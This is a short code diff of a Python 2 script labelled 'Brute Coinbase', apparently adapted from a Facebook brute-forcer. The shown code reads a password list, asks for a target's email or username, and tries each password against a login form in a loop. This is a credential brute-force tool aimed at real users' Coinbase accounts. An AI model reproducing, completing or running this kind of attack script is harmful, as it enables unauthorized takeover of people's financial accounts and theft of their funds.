@@ -4,7 +4,7 @@ import sys
 if sys.version_info[0] !=2: 
 	print('''--------------------------------------
 	REQUIRED PYTHON 2.x
-	use: python fb2.py
+	use: python conbise
 --------------------------------------
 			''')
 	sys.exit()
@@ -26,7 +26,6 @@ except:
 
 print('\n---------- Brute Coinbase ----------\n')
 file=open('passwords.txt','r')
-gzip
 email=str(raw_input('Enter Email/Username : ').strip())
 
 print ("\nTarget Email ID : ",email)
@@ -39,7 +38,7 @@ while file:
 	if len(passw) < 6:
 		continue
 	print str(i) +" : ",passw
-	response = browser.open(post_url)
+	response = browser.open(get_url)
 	try:
 		if response.code == 200:
 			browser.select_form(nr=0)
